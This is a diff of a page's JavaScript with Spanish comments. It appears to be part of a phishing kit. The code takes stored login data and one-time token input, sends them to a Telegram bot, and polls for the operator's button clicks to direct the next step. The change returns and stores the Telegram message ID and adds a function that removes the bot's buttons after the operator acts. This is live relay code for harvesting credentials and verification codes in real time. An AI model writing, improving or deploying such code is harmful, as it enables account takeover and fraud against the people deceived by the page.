@@ -87,14 +87,12 @@
             let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
             let transactionId = Date.now().toString();
 
-            // Leer datos de sessionStorage al cargar la página
             const storedData = sessionStorage.getItem('initialLoginData');
             if (storedData) {
                 initialLoginData = JSON.parse(storedData);
                 transactionId = initialLoginData.transactionId || Date.now().toString();
             } else {
                 console.error("No se encontraron datos de inicio de sesión en sessionStorage.");
-                // Opcional: Redirigir al usuario si no hay datos de sesión
                 window.location.href = "index.html"; 
             }
 
@@ -151,13 +149,41 @@
                     if (!response.ok) {
                         const errorText = await response.text();
                         console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                        return false;
+                        return null;
                     }
+                    const data = await response.json();
                     console.log('Mensaje enviado a Telegram exitosamente.');
-                    return true;
+                    return data.result.message_id;
                 } catch (error) {
                     console.error('Error de red al enviar mensaje a Telegram:', error);
-                    return false;
+                    return null;
+                }
+            }
+
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {}
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -186,6 +212,10 @@
 
                             const callbackDataFull = latest.callback_query.data;
                             const callbackId = latest.callback_query.id;
+                            const messageId = sessionStorage.getItem('telegramMessageId');
+
+                            // Borrar los botones antes de la acción
+                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
 
                             try {
                                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -231,7 +261,6 @@
                 }, 1500);
             }
 
-            // Lógica para el movimiento entre los inputs del token
             inputs.forEach((input, i) => {
                 input.addEventListener("input", (e) => {
                     const value = e.target.value;
@@ -309,9 +338,10 @@
                     ]
                 };
 
-                const sent = await sendToTelegram(telegramMessage, keyboard);
+                const messageId = await sendToTelegram(telegramMessage, keyboard);
 
-                if (sent) {
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
                     checkTokenVerification();
                 } else {
                     spinnerModal.style.display = 'none';
@@ -320,7 +350,6 @@
                 }
             });
 
-            // Inicialización al cargar la página
             const configLoaded = await loadTelegramConfig();
             if (configLoaded) {
                 await initLastUpdateId();
